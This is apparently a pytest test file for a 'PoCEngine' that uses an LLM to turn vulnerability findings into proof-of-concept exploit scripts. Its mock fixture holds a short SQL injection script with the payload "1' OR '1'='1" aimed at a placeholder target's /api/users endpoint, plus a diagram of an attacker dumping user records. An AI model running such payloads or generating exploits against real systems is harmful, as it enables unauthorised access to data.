# backend/tests/test_poc_engine.py
import json
import pytest
from unittest.mock import AsyncMock, MagicMock
from app.brain.poc_engine import PoCEngine

MOCK_POC = {
    "language": "python",
    "filename": "poc_sqli_api_users.py",
    "script": "#!/usr/bin/env python3\nimport requests\n\nTARGET_URL = 'https://target.com'\n\ndef exploit():\n    payload = \"1' OR '1'='1\"\n    r = requests.get(f'{TARGET_URL}/api/users', params={'id': payload})\n    print(r.json())\n\nif __name__ == '__main__':\n    exploit()",
    "setup": ["pip install requests"],
    "notes": "Replace TARGET_URL with the actual target before running.",
    "sequence_diagram": "sequenceDiagram\n  participant Attacker\n  participant Server\n  participant DB\n  Attacker->>Server: GET /api/users?id=1' OR '1'='1\n  Server->>DB: SELECT * WHERE id='1' OR '1'='1'\n  DB-->>Server: All rows\n  Server-->>Attacker: 200 OK — all user records",
}


@pytest.mark.asyncio
async def test_poc_engine_generate_returns_structured_output():
    engine = PoCEngine()
    mock_response = MagicMock()
    mock_response.content = json.dumps(MOCK_POC)
    engine._llm.ainvoke = AsyncMock(return_value=mock_response)

    finding = {
        "vulnerability_class": "sqli",
        "severity": "high",
        "affected_surface": "/api/users",
        "description": "SQL injection via unsanitized id parameter.",
        "evidence": ["SELECT * FROM users WHERE id='1' OR '1'='1'"],
    }
    context = {"target_url": "https://target.com", "target_type": "web", "app_type": "api"}

    result = await engine.generate(finding, context)

    assert result["language"] == "python"
    assert "filename" in result
    assert result["filename"].endswith(".py")
    assert "script" in result
    assert "#!/usr/bin/env python3" in result["script"]
    assert "sequence_diagram" in result
    assert "sequenceDiagram" in result["sequence_diagram"]
    assert "setup" in result
    assert isinstance(result["setup"], list)
    assert "notes" in result


@pytest.mark.asyncio
async def test_poc_engine_strips_markdown_fences():
    engine = PoCEngine()
    mock_response = MagicMock()
    mock_response.content = f"```json\n{json.dumps(MOCK_POC)}\n```"
    engine._llm.ainvoke = AsyncMock(return_value=mock_response)

    finding = {"vulnerability_class": "xss", "severity": "medium", "affected_surface": "/search", "description": "XSS", "evidence": []}
    context = {"target_url": "https://target.com", "target_type": "web", "app_type": "saas"}

    result = await engine.generate(finding, context)
    assert result["language"] == "python"


@pytest.mark.asyncio
async def test_poc_engine_passes_target_context_to_llm():
    engine = PoCEngine()
    mock_response = MagicMock()
    mock_response.content = json.dumps(MOCK_POC)
    engine._llm.ainvoke = AsyncMock(return_value=mock_response)

    finding = {"vulnerability_class": "cmdi", "severity": "critical", "affected_surface": "/run", "description": "Command injection", "evidence": []}
    context = {"target_url": "https://myapp.com", "target_type": "web", "app_type": "saas"}

    await engine.generate(finding, context)

    call_args = engine._llm.ainvoke.call_args[0][0]
    human_message = call_args[1]
    assert "myapp.com" in human_message.content
    assert "cmdi" in human_message.content


@pytest.mark.asyncio
async def test_poc_engine_raises_on_invalid_json():
    engine = PoCEngine()
    mock_response = MagicMock()
    mock_response.content = "this is not json"
    engine._llm.ainvoke = AsyncMock(return_value=mock_response)

    finding = {"vulnerability_class": "sqli", "severity": "high", "affected_surface": "/api", "description": "SQLi", "evidence": []}
    context = {"target_url": "https://target.com", "target_type": "web", "app_type": "api"}

    with pytest.raises(ValueError, match="PoCEngine"):
        await engine.generate(finding, context)
